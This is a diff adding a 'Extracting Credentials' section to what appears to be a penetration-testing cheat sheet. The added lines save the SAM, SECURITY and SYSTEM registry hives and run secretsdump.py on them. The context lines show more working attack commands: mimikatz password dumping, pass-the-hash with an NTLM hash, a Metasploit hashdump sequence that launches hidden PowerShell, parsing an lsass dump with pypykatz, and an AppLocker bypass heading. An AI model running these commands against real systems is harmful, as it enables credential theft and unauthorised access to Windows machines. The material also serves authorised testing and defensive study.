@@ -536,6 +536,8 @@ If you have path traversal plus a location with write access you can exploit tha
 - PW Dump oneliner: `mimikatz.exe privilege::debug sekurlsa::logonPasswords exit > output.txt`
 - Start shell with NTLM hash of user:  
   `mimikatz # sekurlsa::pth /user:admin-kiwi /domain:comp-internal /ntlm:cc36cf7a8514893efccd332446158b1a /run:cmd`  
+  
+## Extracting Credentials   
 - Possible attack sequence with metasploit:  
   1. Run Metasploit's "hashdump" to get hashes: `hashdump`  
   2. Start a process under the desired identity: `mimikatz sekurlsa::pth /user:Administrator /domain:. /ntlm:… /run:"powershell -w hidden"`  
@@ -549,6 +551,11 @@ If you have path traversal plus a location with write access you can exploit tha
   `# pip3 install pypykatz`  
   Extract the creds from the lsass.dmp:   
   `# pypykatz lsa minidump lsass.dmp`  
+- Using registry (security,sam and system)   
+  `C:\> reg.exe save hklm\sam c:\temp\sam.save`   
+  `C:\> reg.exe save hklm\security c:\temp\security.save`   
+  `C:\> reg.exe save hklm\system c:\temp\system.save`   
+  `# secretsdump.py -sam sam.save -security security.save -system system.save LOCAL`   
     
 ## Bypass Applocker
 - Bypass Applocker with mimilib.dll to run arbitrary executables:  
